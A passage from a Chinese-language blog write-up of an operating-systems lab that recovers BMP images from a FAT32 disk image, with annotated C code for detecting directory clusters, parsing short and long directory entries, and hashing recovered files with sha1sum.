class="line"><span class="meta">#<span class="keyword">define</span> ATTR_DIR                (0x1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTR_FIL                (0x2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 参数1： const DIR *dir</span></span><br><span class="line"><span class="comment"> * 返回值： int ans</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 即判断当前簇是否为目录项</span></span><br><span class="line"><span class="comment"> * 这里为了避免程序崩溃，使用严格一点的检测方法——</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 保留字段是否正确、长名称是否正确、属性是否正确</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 如果当前簇是目录簇，则返回1即可</span></span><br><span class="line"><span class="comment"> * 否则，返回0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">is_dir_entry</span><span class="params">(<span class="type">const</span> DIR *dir)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> entry_size = byte_per_clus / <span class="keyword">sizeof</span>(DIR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 排除没有使用过的簇</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(dir-&gt;sdir.Name[<span class="number">0</span>] == <span class="number">0</span>) &#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; entry_size;) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(dir[i].sdir.Name[<span class="number">0</span>] == <span class="string">&#x27;\xe5&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 当前entry是无效的，直接略过即可</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            ++i;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dir[i].ldir.Attr == ATTR_LONG_NAME) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 如果当前是长目录</span></span><br><span class="line"><span class="comment">             * 则其不超过当前簇的后连续几个entry是有固定特征的</span></span><br><span class="line"><span class="comment">             * 进行检测即可</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">int</span> size = dir[i].ldir.Ord;</span><br><span class="line">            <span class="keyword">if</span>(dir[i].ldir.Ord &gt; LAST_LONG_ENTRY) &#123; size ^= LAST_LONG_ENTRY; &#125;</span><br><span class="line"></span><br><span class="line">            size = size &lt;= (entry_size - <span class="number">1</span> - i) ? size : (entry_size - <span class="number">1</span> - i);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//检查长名称目录项是否合规</span></span><br><span class="line">            <span class="keyword">if</span>(dir[i].ldir.Type != <span class="number">0</span> || dir[i].ldir.FstClusLO != <span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; size; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span>(dir[i + j].ldir.Ord != (size - j) || dir[i + j].ldir.Type != <span class="number">0</span> || dir[i + j].ldir.FstClusLO != <span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//检查短目录即可</span></span><br><span class="line">            <span class="keyword">if</span>(i + size &lt; entry_size &amp;&amp; (dir[size].sdir.NTRes != <span class="number">0</span> || dir[size].sdir.Name[<span class="number">0</span>] == <span class="number">0</span>)) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">            i += size + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dir[i].sdir.Name[<span class="number">0</span>]) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 普通的目录项</span></span><br><span class="line"><span class="comment">             * 检查一下</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span>(dir[i].sdir.NTRes != <span class="number">0</span> || dir[i].sdir.Name[<span class="number">0</span>] == <span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">            ++i;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 当前目录及以后目录都为空</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">uint8_t</span> *begin = (<span class="type">uint8_t</span>*)(&amp;dir[i]), *end = (<span class="type">uint8_t</span>*)(&amp;dir[entry_size]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">uint8_t</span> *iter = begin; iter &lt; end; ++iter) &#123;</span><br><span class="line">                <span class="keyword">if</span>(*iter) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment"> * 即依次扫描根目录 + 数据区</span></span><br><span class="line"><span class="comment"> * 找到所有的目录——即名称中包含**bmp**文件即可</span></span><br><span class="line"><span class="comment"> * 然后依次解析该目录即可，从而可以找到**bmp**文件的第一个cluster信息</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">scan</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *scan_end = scan_region_addr + byte_of_scan_region;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 生成临时目录，从而存放恢复的图片信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span> path[BUF_SIZE];</span><br><span class="line">    init_temp_name(path, <span class="string">&quot;/tmp/frecov&quot;</span>);</span><br><span class="line">    assert(mkdtemp(path) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] tmp_dir: %s\n&quot;</span>, path);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">uint8_t</span> *clus = scan_region_addr; clus &lt; scan_end; clus += byte_per_clus) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_dir_entry((<span class="type">const</span> DIR*)clus)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 依次解析目录项即可</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">const</span> DIR *dir = (<span class="type">const</span> DIR*)clus;</span><br><span class="line">            <span class="keyword">while</span>(((<span class="type">uintptr_t</span>)dir - (<span class="type">uintptr_t</span>)clus) &lt; byte_per_clus) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">char</span> name[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">                <span class="type">uint8_t</span> attr = ATTR_NUL;</span><br><span class="line">                <span class="type">uint64_t</span> clus = <span class="number">0</span>, size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                dir = parse_dir_entry(dir, name, &amp;attr, &amp;clus, &amp;size);</span><br><span class="line">                <span class="type">uint8_t</span> *addr = (<span class="type">uint8_t</span>*)(data_region_addr + byte_per_clus * (clus - <span class="number">2</span>));</span><br><span class="line">                <span class="keyword">if</span>(attr == ATTR_FIL &amp;&amp; is_bmp((<span class="type">const</span> BMP*)addr, size)) &#123; parse_bmp(name, addr, size, path); &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="解析目录项"><a href="#解析目录项" class="headerlink" title="解析目录项"></a>解析目录项</h3><p>  通过前面的步骤，已经可以找到所有的目录簇，则这里对照目录项的数据结构，依次遍历目录簇中的数据即可，从而获取代表文件的目录项中的文件大小、文件名称和文件第一个簇的位置等信息</p><p>  这里同样有如下几个注意点</p><ol><li>对于长名目录项，可能会跨簇——为了方便起见，当前无论解析到长名目录项跨簇的前半部分(包含相关的第一个长名目录项)，亦或是长名目录项跨簇的后半部分(包含相关的普通目录项)，直接舍弃掉，解析下一个有效的目录项即可</li><li>对于长名目录项来说，其<strong>LDIR_Name*</strong>字段中存储的是<strong>Unicode</strong>编码的文件/目录的名称。这里为了方便起见，直接默认名称全部为英文，从而方便名称的解析</li><li><p>对于普通目录项来说，若其<strong>DIR_Name</strong>的第一个字符为<strong>“/xe5”</strong>或<strong>“/x00”</strong>，则说明当前目录项已经被释放掉，不用进行解析即可</p><p>最终，这部分的实现逻辑如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 参数1： const DIR *dir</span></span><br><span class="line"><span class="comment"> * 参数2： char *name</span></span><br><span class="line"><span class="comment"> * 参数3： attr</span></span><br><span class="line"><span class="comment"> * 参数4： fst_clus</span></span><br><span class="line"><span class="comment"> * 返回值: const DIR* </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参数1传入的是目录项，然后解析出目录名称，目录属性和对应的目录的第一个clus的地址以及文件大小，分别返回给对应的指针即可</span></span><br><span class="line"><span class="comment"> * 最后返回下一个有效的DIR的指针。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 这里需要考虑几个点</span></span><br><span class="line"><span class="comment"> * 1. 长名称，以unicode存储</span></span><br><span class="line"><span class="comment"> * 2. 跨cluster</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 实际上，在遇到跨cluster的目录且不连续，该解析是错误的</span></span><br><span class="line"><span class="comment"> * 但是考虑到之后没有FAT表，所以这里就不处理这种情况了</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> DIR*</span><br><span class="line"><span class="title function_">parse_dir_entry</span><span class="params">(<span class="type">const</span> DIR *dir, <span class="type">char</span> *name, <span class="type">uint8_t</span> *attr, <span class="type">uint64_t</span> *fst_clus, <span class="type">uint64_t</span> *file_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(dir != <span class="literal">NULL</span> &amp;&amp; name != <span class="literal">NULL</span> &amp;&amp; attr != <span class="literal">NULL</span> &amp;&amp; fst_clus != <span class="literal">NULL</span> &amp;&amp; file_size != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dir-&gt;sdir.Name[<span class="number">0</span>] == <span class="string">&#x27;\xe5&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 该目录项被FREE了</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        *attr = ATTR_NUL;</span><br><span class="line">        <span class="keyword">return</span> &amp;dir[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dir-&gt;sdir.Name[<span class="number">0</span>] == <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 该目录项和以后的目录项都是空目录项</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        *attr = ATTR_NUL;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dir-&gt;sdir.Attr == ATTR_LONG_NAME) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果Attr为ATTR_LONG_NAME，则为长名称</span></span><br><span class="line"><span class="comment">         * </span></span><br><span class="line"><span class="comment">         * 这里做简单处理，认为任何一个目录项的ldir个数小于0x40个，</span></span><br><span class="line"><span class="comment">         * </span></span><br><span class="line"><span class="comment">         * 如果ord小于LAST_LONG_ENTRY，则说明为跨簇的长名称，直接返回到下一个即可</span></span><br><span class="line"><span class="comment">         * 否则，获取LDIR的个数，可以简单的通过ord ^ 0x40获取</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//跨簇，则直接返回到下一个即可</span></span><br><span class="line">        <span class="keyword">if</span>(dir-&gt;ldir.Ord &lt; LAST_LONG_ENTRY) &#123;</span><br><span class="line">            attr = ATTR_NUL;</span><br><span class="line">            <span class="keyword">return</span> &amp;dir[dir-&gt;ldir.Ord + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> size = dir-&gt;ldir.Ord ^ LAST_LONG_ENTRY;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 根据前面的分析</span></span><br><span class="line"><span class="comment">         * 解析到跨cluster的目录项，会出现错误</span></span><br><span class="line"><span class="comment">         * 则这里不解析即可</span></span><br><span class="line"><span class="comment">         * 如果检测到异常，则直接终止</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; size; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(dir[i].ldir.Ord != (size - i) || dir[i].ldir.Attr != ATTR_LONG_NAME || dir[i].ldir.Type != <span class="number">0</span> || dir[i].ldir.FstClusLO != <span class="number">0</span>) &#123;</span><br><span class="line">                attr = ATTR_NUL;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dir[size].sdir.Attr == LAST_LONG_ENTRY || dir[size].sdir.NTRes != <span class="number">0</span>) &#123;</span><br><span class="line">            attr = ATTR_NUL;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解析目录名称，这里默认全英文名称</span></span><br><span class="line">        <span class="type">int</span> name_size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j += <span class="number">2</span>) &#123; name[name_size++] = dir[size - <span class="number">1</span> - i].ldir.Name1[j]; &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">12</span>; j += <span class="number">2</span>) &#123; name[name_size++] = dir[size - <span class="number">1</span> - i].ldir.Name2[j]; &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j += <span class="number">2</span>) &#123; name[name_size++] = dir[size - <span class="number">1</span> - i].ldir.Name3[j]; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        name[name_size] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//解析其余信息</span></span><br><span class="line">        <span class="keyword">if</span>(dir[size].sdir.Attr == ATTR_DIRECTORY) &#123; *attr = ATTR_DIR; &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123; *attr = ATTR_FIL; &#125;</span><br><span class="line">        *fst_clus = (dir[size].sdir.FstClusLO) | (((<span class="type">uint64_t</span>)dir[size].sdir.FstClusHI) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">        *file_size = dir[size].sdir.FileSize;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(dir[size + <span class="number">1</span>].sdir.Name[<span class="number">0</span>] == <span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="literal">NULL</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &amp;dir[size + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 当前为正常的短目录项</span></span><br><span class="line"><span class="comment">         * 则解析其名称即可</span></span><br><span class="line"><span class="comment">         * </span></span><br><span class="line"><span class="comment">         * 也就是分别判断前8字符和后3字符即可</span></span><br><span class="line"><span class="comment">         * 这里需用通过iconv，将其转换为unicode</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">int</span> name_size = <span class="number">0</span>, idx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(; idx &lt; <span class="number">8</span> &amp;&amp; dir-&gt;sdir.Name[idx] != <span class="string">&#x27; &#x27;</span>; ++idx) &#123; name[name_size++] = dir-&gt;sdir.Name[idx]; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(name_size == <span class="number">8</span> &amp;&amp; dir-&gt;sdir.Name[idx] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">            name[name_size++] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(; idx &lt; <span class="number">11</span> &amp;&amp; dir-&gt;sdir.Name[idx] != <span class="string">&#x27; &#x27;</span>; ++idx) &#123; name[name_size++] = dir-&gt;sdir.Name[idx]; &#125;</span><br><span class="line">            name[name_size++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//解析其余信息</span></span><br><span class="line">        <span class="keyword">if</span>(dir[<span class="number">0</span>].sdir.Attr == ATTR_DIRECTORY) &#123; *attr = ATTR_DIR; &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123; *attr = ATTR_FIL; &#125;</span><br><span class="line">        *fst_clus = (dir[<span class="number">0</span>].sdir.FstClusLO) | (((<span class="type">uint64_t</span>)dir[<span class="number">0</span>].sdir.FstClusHI) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">        *file_size = dir[<span class="number">0</span>].sdir.FileSize;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(dir[<span class="number">1</span>].sdir.Name[<span class="number">0</span>] == <span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="literal">NULL</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> &amp;dir[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="解析BMP文件"><a href="#解析BMP文件" class="headerlink" title="解析BMP文件"></a>解析BMP文件</h3><p>  经过前面的步骤，我们获取了可能的<strong>BMP</strong>文件的文件名称、文件数据的第一个簇的位置和文件大小。</p><p>  下面我们就解析文件，从而获取<strong>BMP</strong>文件即可</p><ol><li>检测<strong>BMP</strong>格式<br>这里的方法和前面检验<strong>FAT</strong>文件系统的方法非常类似——就是通过验证文件头特征，从而进行检测。<br>当然，对于该实验情况，还可以额外验证<strong>BMP</strong>格式的文件头中<strong>size</strong>字段是否和前面目录项中解析出来的文件大小相等</li><li><p>解析<strong>BMP</strong>文件数据<br>虽然实验指南中给了一些非常巧妙的方法，这里由于时间关系，就默认<strong>BMP</strong>文件数据是连续存放在文件系统中的。也就是前面获取的文件数据的第一个簇位置，其后面紧接着解析出的文件大小的数据，就是该<strong>BMP</strong>文件的所有数据</p><p>当我们获取了<strong>BMP</strong>文件的数据后，就将其数据输出到临时文件中，然后根据实验指南的提示，通过<code>popen()</code>，调用<strong>sha1sum</strong>命令获取文件的<strong>sha1</strong>值，然后数据即可</p><p>这部分实现的逻辑如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 参数1： const char *name</span></span><br><span class="line"><span class="comment"> * 参数2： uint8_t *addr</span></span><br><span class="line"><span class="comment"> * 参数3： uint64_t size</span></span><br><span class="line"><span class="comment"> * 参数4: char *dir</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 即将addr出，大小为size字节，文件名称为name的bmp图片解析出来</span></span><br><span class="line"><span class="comment"> * 将临时文件输出到path对应的目录中，并且</span></span><br><span class="line"><span class="comment"> * 这里简单起见，默认cluster是连续存放的，则直接获取即可(估计准确率比较低，但是懒得在实现基于边界，查找可能的cluster)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">parse_bmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">const</span> <span class="type">uint8_t</span> *addr, <span class="type">const</span> <span class="type">uint64_t</span> size, <span class="type">const</span> <span class="type">char</span> *dir)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 生成临时文件，存放解析出来的bmp文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;, path[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> fd = <span class="number">0</span>, write_total_size = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;%s&quot;</span>, dir);</span><br><span class="line">    <span class="built_in">strcat</span>(buf, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    init_temp_name(path, buf);</span><br><span class="line">    assert((fd = mkstemp(path)) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(write_total_size &lt; size) &#123;</span><br><span class="line">        <span class="type">int</span> write_size = write(fd, addr + write_total_size, size - write_total_size);</span><br><span class="line"></span><br><span class="line">        assert(write_size &gt;= <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        write_total_size += write_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] write the %s to %s\n&quot;</span>, name, path);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 通过popen</span></span><br><span class="line"><span class="comment">     * 执行sha1sum [file]</span></span><br><span class="line"><span class="comment">     * 从而方便快捷的获取该文件的sha信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    FILE *handle = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> cmd[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd, <span class="string">&quot;sha1sum &quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(cmd, path);</span><br><span class="line">    assert((handle = popen(cmd, <span class="string">&quot;r&quot;</span>)) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 获取fd中的sha1输出</span></span><br><span class="line"><span class="comment">     * 然后拼接文件名即可</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    buf[<span class="number">40</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">fscanf</span>(handle, <span class="string">&quot;%40s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s  %s\n&quot;</span>, buf, name);</span><br><span class="line"></span><br><span class="line">    fclose(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 参数1： const BMP *bmp</span></span><br><span class="line"><span class="comment"> * 返回值： int res</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 即判断bmp对应的是否为BMP头文件</span></span><br><span class="line"><span class="comment"> * 通过判断魔数和文件大小进行判断</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 